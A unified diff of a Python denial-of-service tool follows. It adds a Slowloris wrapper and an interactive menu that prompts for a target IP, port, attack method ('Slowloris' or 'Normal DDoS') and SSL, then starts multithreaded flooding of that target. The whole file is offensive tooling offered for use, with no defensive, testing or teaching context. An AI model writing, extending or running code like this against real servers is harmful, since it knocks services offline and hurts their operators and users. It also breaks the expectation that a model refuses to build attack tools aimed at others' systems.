@@ -1,9 +1,8 @@
 import socket
 import threading
-
 from slowloris import slowloris_attack
 
-def perform_ddos_attack(target_ip, target_port=80, num_threads=10):
+def perform_ddos_attack(target_ip, target_port, num_threads=10):
     def attack():
         while True:
             try:
@@ -32,14 +31,38 @@ def perform_ddos_attack(target_ip, target_port=80, num_threads=10):
     for thread in threads:
         thread.join()
 
+    print("\nDDoS attack complete.")
+
+def slowloris_ddos(host, port, num_connections=100, https=False, proxy=False, sleep_time=5):
+    if 0.1 <= sleep_time <= 10:
+        slowloris_attack(host, port, num_connections, True, https, proxy, None, None, False, sleep_time)
+    else:
+        print("Invalid sleep time. Please enter a value between 0.1 and 10 seconds.")
+
 def ddos(host, port, ssl=False, method=None):
     if method == 1:
-        slowloris_attack(host, port, 100, True, True, False, None, None, ssl, 5)
+        sleep_time = float(input("Enter Slowloris sleep time duration (in seconds): "))
+        slowloris_ddos(host, port, 100, ssl, True, sleep_time)
     
     if method == 2:
         perform_ddos_attack(host, port, 100)
 
-# Usage:
-# Methods:
-# 1. Slowloris
-# 2. Normal DDoS
+def perform_ddos_attack_wrapper():
+    target_ip = input("Enter target IP address: ")
+    target_port = int(input("Enter target port: "))
+
+    print("Choose DDoS method:")
+    print("[1] Slowloris")
+    print("[2] Normal DDoS")
+    method = int(input("Enter method number: "))
+
+    ssl = input("Use SSL? (yes/no): ").lower() == "yes"
+
+    if method == 1:
+        sleep_time = float(input("Enter Slowloris sleep time duration (in seconds): "))
+        slowloris_ddos(target_ip, target_port, 100, ssl, True, sleep_time)
+    elif method == 2:
+        perform_ddos_attack(target_ip, target_port, 100)
+
+# Example Usage:
+# perform_ddos_attack_wrapper()
